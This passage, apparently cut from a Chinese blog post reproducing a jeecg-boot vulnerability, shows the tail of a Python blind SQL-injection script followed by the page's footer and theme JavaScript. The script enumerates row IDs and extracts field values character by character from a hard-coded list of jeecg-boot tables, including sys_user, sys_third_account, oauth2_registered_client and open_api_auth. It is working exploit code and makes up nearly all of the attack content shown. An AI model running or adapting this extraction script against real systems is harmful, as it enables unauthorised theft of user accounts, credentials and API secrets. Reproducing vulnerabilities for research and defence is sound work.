</span><br><span class="line">            cond = <span class="string">f&quot;exists(select 1 from <span class="subst">&#123;table&#125;</span> where cast((<span class="subst">&#123;subquery&#125;</span>) as char) like &#x27;<span class="subst">&#123;safe_value&#125;</span><span class="subst">&#123;c&#125;</span>%&#x27;)&quot;</span>  </span><br><span class="line">            <span class="keyword">if</span> send_payload(cond):  </span><br><span class="line">                value += c  </span><br><span class="line">                found = <span class="literal">True</span>  </span><br><span class="line">                <span class="keyword">break</span>        <span class="keyword">if</span> <span class="keyword">not</span> found:  </span><br><span class="line">            <span class="comment"># 理论上长度已知，不会找不到  </span></span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">return</span> value  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_all_row_ids</span>(<span class="params">table</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;获取表中所有行的 ID（按升序）&quot;&quot;&quot;</span>  </span><br><span class="line">    rows = []  </span><br><span class="line">    <span class="comment"># 第一行  </span></span><br><span class="line">    subquery_first = <span class="string">f&quot;select min(<span class="subst">&#123;ID_FIELD&#125;</span>) from <span class="subst">&#123;table&#125;</span>&quot;</span>  </span><br><span class="line">    length = get_value_length_by_subquery(table, subquery_first)  </span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span>:  </span><br><span class="line">        <span class="keyword">return</span> rows  </span><br><span class="line">    first_id = get_value_by_subquery(table, subquery_first, length)  </span><br><span class="line">    rows.append(first_id)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 后续行  </span></span><br><span class="line">    current_id = first_id  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">        <span class="comment"># 判断是否存在下一行  </span></span><br><span class="line">        exists_cond = <span class="string">f&quot;exists(select 1 from <span class="subst">&#123;table&#125;</span> where <span class="subst">&#123;ID_FIELD&#125;</span> &gt; &#x27;<span class="subst">&#123;current_id&#125;</span>&#x27;)&quot;</span>  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> send_payload(exists_cond):  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">        <span class="comment"># 获取下一行的 ID        subquery_next = f&quot;select min(&#123;ID_FIELD&#125;) from &#123;table&#125; where &#123;ID_FIELD&#125; &gt; &#x27;&#123;current_id&#125;&#x27;&quot;  </span></span><br><span class="line">        length = get_value_length_by_subquery(table, subquery_next)  </span><br><span class="line">        <span class="keyword">if</span> length == <span class="number">0</span>:  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">        next_id = get_value_by_subquery(table, subquery_next, length)  </span><br><span class="line">        rows.append(next_id)  </span><br><span class="line">        current_id = next_id  </span><br><span class="line">    <span class="keyword">return</span> rows  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_field_value_by_id</span>(<span class="params">table, field, row_id</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    获取指定表中某行（由 row_id 标识）的 field 字段值  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    <span class="comment"># 如果字段就是 ID_FIELD，直接返回已缓存的 row_id（避免重复盲注）  </span></span><br><span class="line">    <span class="keyword">if</span> field == ID_FIELD:  </span><br><span class="line">        <span class="keyword">return</span> row_id  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 先检查该行该字段是否有值（非 NULL）  </span></span><br><span class="line">    has_value_cond = <span class="string">f&quot;exists(select 1 from <span class="subst">&#123;table&#125;</span> where <span class="subst">&#123;ID_FIELD&#125;</span> = &#x27;<span class="subst">&#123;row_id&#125;</span>&#x27; and <span class="subst">&#123;field&#125;</span> is not null)&quot;</span>    <span class="keyword">if</span> <span class="keyword">not</span> send_payload(has_value_cond):  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># 值为 NULL  </span></span><br><span class="line">    <span class="comment"># 获取字段长度  </span></span><br><span class="line">    length_cond = <span class="string">f&quot;exists(select 1 from <span class="subst">&#123;table&#125;</span> where <span class="subst">&#123;ID_FIELD&#125;</span> = &#x27;<span class="subst">&#123;row_id&#125;</span>&#x27; and length(<span class="subst">&#123;field&#125;</span>) &gt; &#123;&#123;n&#125;&#125;)&quot;</span>  </span><br><span class="line">    length = linear_search_length(length_cond, start=<span class="number">0</span>)  </span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span>:  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>  <span class="comment"># 空字符串  </span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 逐字符探测  </span></span><br><span class="line">    value = <span class="string">&quot;&quot;</span>  </span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):  </span><br><span class="line">        found = <span class="literal">False</span>  </span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> CHARS_ASC:  </span><br><span class="line">            safe_value = value.replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&#x27;&#x27;&quot;</span>)  </span><br><span class="line">            cond = <span class="string">f&quot;exists(select 1 from <span class="subst">&#123;table&#125;</span> where <span class="subst">&#123;ID_FIELD&#125;</span> = &#x27;<span class="subst">&#123;row_id&#125;</span>&#x27; and cast(<span class="subst">&#123;field&#125;</span> as char) like &#x27;<span class="subst">&#123;safe_value&#125;</span><span class="subst">&#123;c&#125;</span>%&#x27;)&quot;</span>  </span><br><span class="line">            <span class="keyword">if</span> send_payload(cond):  </span><br><span class="line">                value += c  </span><br><span class="line">                found = <span class="literal">True</span>  </span><br><span class="line">                <span class="keyword">break</span>        <span class="keyword">if</span> <span class="keyword">not</span> found:  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">return</span> value  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():  </span><br><span class="line">    tables = [  </span><br><span class="line">        <span class="string">&#x27;aigc_word_template&#x27;</span>, <span class="string">&#x27;airag_app&#x27;</span>, <span class="string">&#x27;airag_ext_data&#x27;</span>, <span class="string">&#x27;airag_flow&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;airag_knowledge&#x27;</span>, <span class="string">&#x27;airag_knowledge_doc&#x27;</span>, <span class="string">&#x27;airag_mcp&#x27;</span>, <span class="string">&#x27;airag_model&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;airag_prompts&#x27;</span>, <span class="string">&#x27;demo&#x27;</span>, <span class="string">&#x27;flyway_schema_history&#x27;</span>, <span class="string">&#x27;jeecg_order_customer&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;jeecg_order_main&#x27;</span>, <span class="string">&#x27;jeecg_order_ticket&#x27;</span>, <span class="string">&#x27;jimu_dict&#x27;</span>, <span class="string">&#x27;jimu_dict_item&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;jimu_report&#x27;</span>, <span class="string">&#x27;jimu_report_category&#x27;</span>, <span class="string">&#x27;jimu_report_data_source&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;jimu_report_db&#x27;</span>, <span class="string">&#x27;jimu_report_db_field&#x27;</span>, <span class="string">&#x27;jimu_report_db_param&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;jimu_report_export_job&#x27;</span>, <span class="string">&#x27;jimu_report_export_log&#x27;</span>, <span class="string">&#x27;jimu_report_ext_data&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;jimu_report_icon_lib&#x27;</span>, <span class="string">&#x27;jimu_report_link&#x27;</span>, <span class="string">&#x27;jimu_report_map&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;jimu_report_share&#x27;</span>, <span class="string">&#x27;jimu_report_sheet&#x27;</span>, <span class="string">&#x27;joa_demo&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;oauth2_registered_client&#x27;</span>, <span class="string">&#x27;onl_auth_data&#x27;</span>, <span class="string">&#x27;onl_auth_page&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;onl_auth_relation&#x27;</span>, <span class="string">&#x27;onl_cgform_button&#x27;</span>, <span class="string">&#x27;onl_cgform_enhance_java&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;onl_cgform_enhance_js&#x27;</span>, <span class="string">&#x27;onl_cgform_enhance_sql&#x27;</span>, <span class="string">&#x27;onl_cgform_field&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;onl_cgform_head&#x27;</span>, <span class="string">&#x27;onl_cgform_index&#x27;</span>, <span class="string">&#x27;onl_cgreport_head&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;onl_cgreport_item&#x27;</span>, <span class="string">&#x27;onl_cgreport_param&#x27;</span>, <span class="string">&#x27;onl_drag_comp&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;onl_drag_dataset_head&#x27;</span>, <span class="string">&#x27;onl_drag_dataset_item&#x27;</span>, <span class="string">&#x27;onl_drag_dataset_param&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;onl_drag_page&#x27;</span>, <span class="string">&#x27;onl_drag_page_comp&#x27;</span>, <span class="string">&#x27;onl_drag_share&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;onl_drag_table_relation&#x27;</span>, <span class="string">&#x27;open_api&#x27;</span>, <span class="string">&#x27;open_api_auth&#x27;</span>, <span class="string">&#x27;open_api_log&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;open_api_permission&#x27;</span>, <span class="string">&#x27;oss_file&#x27;</span>, <span class="string">&#x27;qrtz_blob_triggers&#x27;</span>, <span class="string">&#x27;qrtz_calendars&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;qrtz_cron_triggers&#x27;</span>, <span class="string">&#x27;qrtz_fired_triggers&#x27;</span>, <span class="string">&#x27;qrtz_job_details&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;qrtz_locks&#x27;</span>, <span class="string">&#x27;qrtz_paused_trigger_grps&#x27;</span>, <span class="string">&#x27;qrtz_scheduler_state&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;qrtz_simple_triggers&#x27;</span>, <span class="string">&#x27;qrtz_simprop_triggers&#x27;</span>, <span class="string">&#x27;qrtz_triggers&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;rep_demo_dxtj&#x27;</span>, <span class="string">&#x27;rep_demo_employee&#x27;</span>, <span class="string">&#x27;rep_demo_gongsi&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;rep_demo_jianpiao&#x27;</span>, <span class="string">&#x27;rep_demo_order_main&#x27;</span>, <span class="string">&#x27;rep_demo_order_product&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;sys_announcement&#x27;</span>, <span class="string">&#x27;sys_announcement_send&#x27;</span>, <span class="string">&#x27;sys_category&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;sys_check_rule&#x27;</span>, <span class="string">&#x27;sys_comment&#x27;</span>, <span class="string">&#x27;sys_data_log&#x27;</span>, <span class="string">&#x27;sys_data_source&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;sys_depart&#x27;</span>, <span class="string">&#x27;sys_depart_permission&#x27;</span>, <span class="string">&#x27;sys_depart_role&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;sys_depart_role_permission&#x27;</span>, <span class="string">&#x27;sys_depart_role_user&#x27;</span>, <span class="string">&#x27;sys_dict&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;sys_dict_item&#x27;</span>, <span class="string">&#x27;sys_files&#x27;</span>, <span class="string">&#x27;sys_fill_rule&#x27;</span>, <span class="string">&#x27;sys_form_file&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;sys_gateway_route&#x27;</span>, <span class="string">&#x27;sys_permission&#x27;</span>, <span class="string">&#x27;sys_permission_data_rule&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;sys_position&#x27;</span>, <span class="string">&#x27;sys_quartz_job&#x27;</span>, <span class="string">&#x27;sys_role&#x27;</span>, <span class="string">&#x27;sys_role_index&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;sys_role_permission&#x27;</span>, <span class="string">&#x27;sys_sms&#x27;</span>, <span class="string">&#x27;sys_sms_template&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;sys_table_white_list&#x27;</span>, <span class="string">&#x27;sys_tenant&#x27;</span>, <span class="string">&#x27;sys_tenant_pack&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;sys_tenant_pack_perms&#x27;</span>, <span class="string">&#x27;sys_tenant_pack_user&#x27;</span>, <span class="string">&#x27;sys_third_account&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;sys_third_app_config&#x27;</span>, <span class="string">&#x27;sys_user&#x27;</span>, <span class="string">&#x27;sys_user_dep_post&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;sys_user_depart&#x27;</span>, <span class="string">&#x27;sys_user_position&#x27;</span>, <span class="string">&#x27;sys_user_role&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;sys_user_tenant&#x27;</span>, <span class="string">&#x27;test_demo&#x27;</span>, <span class="string">&#x27;test_enhance_select&#x27;</span>, <span class="string">&#x27;test_note&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;test_online_link&#x27;</span>, <span class="string">&#x27;test_order_customer&#x27;</span>, <span class="string">&#x27;test_order_main&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;test_order_product&#x27;</span>, <span class="string">&#x27;test_person&#x27;</span>, <span class="string">&#x27;test_shoptype_tree&#x27;</span>  </span><br><span class="line">    ]  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 共 <span class="subst">&#123;<span class="built_in">len</span>(tables)&#125;</span> 张表需要处理&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 将提取字段: <span class="subst">&#123;FIELDS&#125;</span>\n&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> table <span class="keyword">in</span> tables:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n<span class="subst">&#123;<span class="string">&#x27;=&#x27;</span>*<span class="number">60</span>&#125;</span>\n[*] 处理表: <span class="subst">&#123;table&#125;</span>&quot;</span>)  </span><br><span class="line">        <span class="comment"># 检查是否存在至少一个字段（避免完全无权限的表）  </span></span><br><span class="line">        field_exists = <span class="built_in">any</span>(check_field_exists(table, f) <span class="keyword">for</span> f <span class="keyword">in</span> FIELDS)  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> field_exists:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] 表 <span class="subst">&#123;table&#125;</span> 中不存在任何指定字段，跳过&quot;</span>)  </span><br><span class="line">            <span class="keyword">continue</span>  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> table_has_data(table):  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] 表 <span class="subst">&#123;table&#125;</span> 中无数据，跳过&quot;</span>)  </span><br><span class="line">            <span class="keyword">continue</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># 获取所有行的 ID        print(f&quot;[*] 正在获取所有行的 &#123;ID_FIELD&#125;...&quot;)  </span></span><br><span class="line">        row_ids = get_all_row_ids(table)  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> row_ids:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] 无法获取行 <span class="subst">&#123;ID_FIELD&#125;</span>，跳过&quot;</span>)  </span><br><span class="line">            <span class="keyword">continue</span>  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 共 <span class="subst">&#123;<span class="built_in">len</span>(row_ids)&#125;</span> 行&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># 对每一行提取所有字段  </span></span><br><span class="line">        <span class="keyword">for</span> idx, row_id <span class="keyword">in</span> <span class="built_in">enumerate</span>(row_ids, start=<span class="number">1</span>):  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n   行 <span class="subst">&#123;idx&#125;</span> (ID: <span class="subst">&#123;row_id&#125;</span>)&quot;</span>)  </span><br><span class="line">            row_data = &#123;ID_FIELD: row_id&#125;  </span><br><span class="line">            <span class="keyword">for</span> field <span class="keyword">in</span> FIELDS:  </span><br><span class="line">                <span class="keyword">if</span> field == ID_FIELD:  </span><br><span class="line">                    <span class="keyword">continue</span>  <span class="comment"># 已缓存  </span></span><br><span class="line">                <span class="comment"># 检查字段是否存在（表级）  </span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> check_field_exists(table, field):  </span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;      [!] 字段 <span class="subst">&#123;field&#125;</span> 不存在，跳过&quot;</span>)  </span><br><span class="line">                    <span class="keyword">continue</span>  </span><br><span class="line">                <span class="comment"># 获取字段值  </span></span><br><span class="line">                value = get_field_value_by_id(table, field, row_id)  </span><br><span class="line">                <span class="keyword">if</span> value <span class="keyword">is</span> <span class="literal">None</span>:  </span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;      <span class="subst">&#123;field&#125;</span>: NULL&quot;</span>)  </span><br><span class="line">                <span class="keyword">else</span>:  </span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;      <span class="subst">&#123;field&#125;</span>: <span class="subst">&#123;value&#125;</span>&quot;</span>)  </span><br><span class="line">                row_data[field] = value  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../source/imgs/$%7Bfiilname%7D/image-20260401213035800.png" alt="image-20260401213035800"></p>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>License</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">Newer</div><a href="/2026/05/05/copy-fail-CVE-2026-31431/">copy-fail-CVE-2026-31431</a></div><div class="item" id="next"><div class="note">Older</div><a href="/2026/03/15/jeecg-boot-3-8-3-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">jeecg-boot 3.8.3 rce漏洞复现分析</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Sherlock</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar 1.33.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">On This Page</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>Scroll to Top</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `Just`,
+      min: `minutes ago`,
+      hour: `hours ago`,
+      day: `days ago`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
